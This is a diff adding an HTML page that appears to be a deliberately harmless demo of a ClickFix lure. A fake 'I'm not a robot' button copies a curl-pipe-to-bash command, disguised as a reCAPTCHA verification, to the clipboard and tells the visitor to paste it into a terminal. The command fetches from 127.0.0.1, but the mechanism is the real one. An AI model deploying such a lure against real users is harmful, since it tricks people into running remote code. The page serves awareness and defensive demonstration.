@@ -1,0 +1,52 @@
+<!doctype html>
+<!-- SAFE SIMULATED CLICKFIX LURE for the clickfixed demo.
+     The copied command fetches demo/verify.sh from 127.0.0.1, which only prints a message.
+     Serve with demo/serve.sh. Never host this publicly. -->
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Verify you are human</title>
+<style>
+  :root { --bg:#f4f5f7; --card:#fff; --ink:#1d2433; --muted:#5b6475; --accent:#1a73e8; --line:#dfe3ea; }
+  @media (prefers-color-scheme: dark) { :root { --bg:#14171c; --card:#1d2128; --ink:#e7eaf0; --muted:#9aa3b2; --accent:#7aa7ff; --line:#2c323c; } }
+  * { box-sizing: border-box; }
+  body { margin:0; min-height:100vh; display:grid; place-items:center; background:var(--bg); color:var(--ink); font:16px/1.5 system-ui, sans-serif; padding:16px; }
+  .card { background:var(--card); border:1px solid var(--line); border-radius:10px; padding:28px; max-width:440px; width:100%; }
+  .banner { font-size:12px; text-transform:uppercase; letter-spacing:.08em; color:#c0392b; font-weight:700; margin-bottom:12px; }
+  h1 { font-size:20px; margin:0 0 8px; }
+  p { color:var(--muted); margin:0 0 16px; }
+  button { background:var(--accent); color:#fff; border:0; border-radius:6px; padding:10px 16px; font-size:15px; cursor:pointer; }
+  ol { padding-left:20px; color:var(--ink); }
+  #steps { display:none; margin-top:16px; border-top:1px solid var(--line); padding-top:16px; }
+  kbd { border:1px solid var(--line); border-radius:4px; padding:1px 6px; font-size:13px; }
+</style>
+</head>
+<body>
+<main class="card">
+  <div class="banner">clickfixed demo: simulated lure</div>
+  <h1>Verify you are human</h1>
+  <p>Complete the verification step to continue to the page.</p>
+  <button id="verify">I'm not a robot</button>
+  <div id="steps">
+    <ol>
+      <li>Open a terminal (<kbd>Ctrl</kbd>+<kbd>Alt</kbd>+<kbd>T</kbd>)</li>
+      <li>Paste with <kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>V</kbd></li>
+      <li>Press <kbd>Enter</kbd></li>
+    </ol>
+  </div>
+</main>
+<script>
+  // Same mechanism real lures use: a click handler writes a command to the clipboard.
+  const CMD = 'bash -c "$(curl -fsSL http://127.0.0.1:8765/verify.sh)" # I am not a robot - reCAPTCHA Verification ID: 2165';
+  document.getElementById('verify').addEventListener('click', async () => {
+    try { await navigator.clipboard.writeText(CMD); }
+    catch (e) {
+      const t = document.createElement('textarea'); t.value = CMD; document.body.appendChild(t);
+      t.select(); document.execCommand('copy'); t.remove();
+    }
+    document.getElementById('steps').style.display = 'block';
+  });
+</script>
+</body>
+</html>
